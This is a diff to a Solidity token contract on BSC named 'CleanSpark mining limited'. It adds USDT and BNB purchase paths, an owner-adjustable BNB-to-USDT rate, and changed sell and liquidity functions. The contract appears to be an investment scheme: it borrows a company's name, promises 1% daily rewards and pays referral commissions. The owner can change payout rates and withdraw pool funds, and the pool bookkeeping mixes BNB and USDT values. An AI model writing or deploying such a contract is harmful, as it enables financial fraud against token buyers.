@@ -6,12 +6,25 @@ pragma solidity ^0.8.0;
  * @notice Fixed price token with 1% daily auto-rewards. Buy/sell at fixed price to prevent manipulation.
  * @dev Security: Reentrancy protection, fixed price mechanism to prevent pump and dump
  */
+
+// IERC20 interface for USDT
+interface IERC20 {
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
 contract DipenMali {
     // Token Info
     string public name = "CleanSpark mining limited";
     string public symbol = "cleanSpark";
     uint8 public decimals = 18;
     uint256 public totalSupply = 10_000_000 * 10**18; // 10 Million
+    
+    // USDT Token Address on BSC (BEP20)
+    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;
     
     // Mappings
     mapping(address => uint256) public balanceOf;
@@ -51,6 +64,10 @@ contract DipenMali {
     // Fixed Price Mechanism (to prevent manipulation)
     uint256 public constant FIXED_PRICE = 1e18; // 1 USDT per token (1 USDT = 1 token)
     uint256 public poolUSDT; // USDT reserve for fixed price trading
+    
+    // BNB to USDT conversion rate (1 BNB = bnbToUsdtRate USDT, with 18 decimals)
+    // Example: 600 USDT per BNB = 600 * 1e18
+    uint256 public bnbToUsdtRate = 600 * 1e18; // Default: 1 BNB = 600 USDT
     
     // Referral System
     uint256 public constant REFERRAL_COMMISSION = 50; // 5% commission (50/1000 = 5%)
@@ -218,12 +235,19 @@ contract DipenMali {
         emit ReferralRegistered(msg.sender, referrer);
     }
     
-    // Buy tokens at fixed price (with referral support)
-    function buyTokens(uint256 usdtAmount) public payable nonReentrant whenNotPaused {
+    // Buy tokens at fixed price with USDT (with referral support)
+    function buyTokens(uint256 usdtAmount) public nonReentrant whenNotPaused {
         require(usdtAmount > 0, "Invalid amount");
         require(usdtAmount <= type(uint256).max / 1e18, "Amount too large");
-        require(msg.value >= usdtAmount, "Insufficient BNB");
         require(msg.sender != address(0), "Invalid sender");
+        
+        // Transfer USDT from user to contract
+        IERC20 usdtToken = IERC20(USDT);
+        require(usdtToken.balanceOf(msg.sender) >= usdtAmount, "Insufficient USDT balance");
+        require(usdtToken.allowance(msg.sender, address(this)) >= usdtAmount, "Insufficient USDT allowance");
+        
+        bool success = usdtToken.transferFrom(msg.sender, address(this), usdtAmount);
+        require(success, "USDT transfer failed");
         
         // Calculate tokens at fixed price
         // FIXED_PRICE = 1 USDT per token
@@ -275,15 +299,10 @@ contract DipenMali {
         
         emit Transfer(owner, msg.sender, tokensToGive);
         emit TokensPurchased(msg.sender, usdtAmount, tokensToGive);
-        
-        // Refund excess BNB
-        if (msg.value > usdtAmount) {
-            payable(msg.sender).transfer(msg.value - usdtAmount);
-        }
     }
     
     // Buy tokens with referral (one function)
-    function buyTokensWithReferral(uint256 usdtAmount, address referrer) public payable whenNotPaused {
+    function buyTokensWithReferral(uint256 usdtAmount, address referrer) public whenNotPaused {
         require(usdtAmount > 0, "Invalid amount");
         require(usdtAmount <= type(uint256).max / 1e18, "Amount too large");
         require(referrer != address(0), "Invalid referrer");
@@ -297,6 +316,86 @@ contract DipenMali {
         
         // Buy tokens (referral handled automatically)
         buyTokens(usdtAmount);
+    }
+    
+    // Buy tokens with BNB (payable function)
+    function buyTokensWithBNB() public payable nonReentrant whenNotPaused {
+        require(msg.value > 0, "Invalid BNB amount");
+        require(msg.sender != address(0), "Invalid sender");
+        
+        // Convert BNB to USDT equivalent
+        // usdtAmount = (msg.value * bnbToUsdtRate) / 1e18
+        uint256 usdtAmount = (msg.value * bnbToUsdtRate) / 1e18;
+        require(usdtAmount > 0, "Amount too small");
+        
+        // Calculate tokens at fixed price (1 USDT = 1 token)
+        uint256 tokensToGive = usdtAmount;
+        
+        // Check owner has enough tokens
+        require(balanceOf[owner] >= tokensToGive, "Insufficient tokens in reserve");
+        
+        // Handle referral commission
+        address referrer = referrerOf[msg.sender];
+        uint256 commission = 0;
+        
+        if (referrer != address(0)) {
+            // Calculate commission (5% of purchase)
+            commission = (usdtAmount * REFERRAL_COMMISSION) / 1000;
+            uint256 commissionTokens = commission;
+            
+            // Check owner has enough for commission
+            if (balanceOf[owner] >= commissionTokens && commissionTokens > 0) {
+                // Transfer commission tokens to referrer
+                balanceOf[owner] -= commissionTokens;
+                balanceOf[referrer] += commissionTokens;
+                
+                // Update referral stats
+                referralEarnings[referrer] += commission;
+                totalReferredVolume[referrer] += usdtAmount;
+                
+                // Auto-register referrer for rewards
+                _autoRegister(referrer);
+                
+                emit Transfer(owner, referrer, commissionTokens);
+                emit ReferralCommission(referrer, msg.sender, commission);
+            }
+        }
+        
+        // Transfer tokens to buyer (after commission)
+        balanceOf[owner] -= tokensToGive;
+        balanceOf[msg.sender] += tokensToGive;
+        
+        // Add USDT equivalent to pool (BNB stored as BNB, but tracked as USDT value)
+        poolUSDT += usdtAmount;
+        
+        // Auto-register for rewards
+        _autoRegister(msg.sender);
+        
+        emit Transfer(owner, msg.sender, tokensToGive);
+        emit TokensPurchased(msg.sender, usdtAmount, tokensToGive);
+    }
+    
+    // Buy tokens with BNB and referral
+    function buyTokensWithBNBAndReferral(address referrer) public payable whenNotPaused {
+        require(msg.value > 0, "Invalid BNB amount");
+        require(referrer != address(0), "Invalid referrer");
+        require(referrer != msg.sender, "Cannot refer yourself");
+        require(referrer.code.length == 0 || referrer == owner, "Referrer cannot be a contract");
+        
+        // Register referral if not already registered
+        if (referrerOf[msg.sender] == address(0) && referrer != address(0)) {
+            registerReferral(referrer);
+        }
+        
+        // Buy tokens with BNB (referral handled automatically)
+        buyTokensWithBNB();
+    }
+    
+    // Owner function to update BNB to USDT conversion rate
+    function setBnbToUsdtRate(uint256 newRate) public onlyOwner {
+        require(newRate > 0, "Invalid rate");
+        require(newRate <= 10000 * 1e18, "Rate too high"); // Max 10000 USDT per BNB
+        bnbToUsdtRate = newRate;
     }
     
     // Sell tokens at fixed price
@@ -327,19 +426,39 @@ contract DipenMali {
         // Update principal to remaining balance
         _updatePrincipal(msg.sender);
         
-        // Send USDT to seller
-        (bool success, ) = payable(msg.sender).call{value: usdtToGive}("");
-        require(success, "Transfer failed");
+        // Try to send USDT first, if fails send BNB
+        IERC20 usdtToken = IERC20(USDT);
+        uint256 usdtBalance = usdtToken.balanceOf(address(this));
+        
+        if (usdtBalance >= usdtToGive) {
+            // Send USDT
+            bool success = usdtToken.transfer(msg.sender, usdtToGive);
+            require(success, "USDT transfer failed");
+        } else {
+            // Convert USDT amount to BNB and send BNB
+            // bnbAmount = (usdtToGive * 1e18) / bnbToUsdtRate
+            uint256 bnbAmount = (usdtToGive * 1e18) / bnbToUsdtRate;
+            require(address(this).balance >= bnbAmount, "Insufficient BNB in contract");
+            (bool success, ) = payable(msg.sender).call{value: bnbAmount}("");
+            require(success, "BNB transfer failed");
+        }
         
         emit Transfer(msg.sender, owner, tokenAmount);
         emit TokensSold(msg.sender, tokenAmount, usdtToGive);
     }
     
     // Owner function to add USDT liquidity for fixed price trading
-    function addLiquidity() public payable onlyOwner {
-        require(msg.value > 0, "Invalid amount");
-        poolUSDT += msg.value;
-        emit LiquidityAdded(owner, msg.value);
+    function addLiquidity(uint256 usdtAmount) public onlyOwner {
+        require(usdtAmount > 0, "Invalid amount");
+        IERC20 usdtToken = IERC20(USDT);
+        require(usdtToken.balanceOf(msg.sender) >= usdtAmount, "Insufficient USDT balance");
+        require(usdtToken.allowance(msg.sender, address(this)) >= usdtAmount, "Insufficient USDT allowance");
+        
+        bool success = usdtToken.transferFrom(msg.sender, address(this), usdtAmount);
+        require(success, "USDT transfer failed");
+        
+        poolUSDT += usdtAmount;
+        emit LiquidityAdded(owner, usdtAmount);
     }
     
     // Owner function to remove USDT liquidity (emergency only)
@@ -347,8 +466,10 @@ contract DipenMali {
         require(amount > 0, "Invalid amount");
         require(poolUSDT >= amount, "Insufficient pool");
         poolUSDT -= amount;
-        (bool success, ) = payable(owner).call{value: amount}("");
-        require(success, "Transfer failed");
+        
+        IERC20 usdtToken = IERC20(USDT);
+        bool success = usdtToken.transfer(owner, amount);
+        require(success, "USDT transfer failed");
     }
     
     // Get pool balance
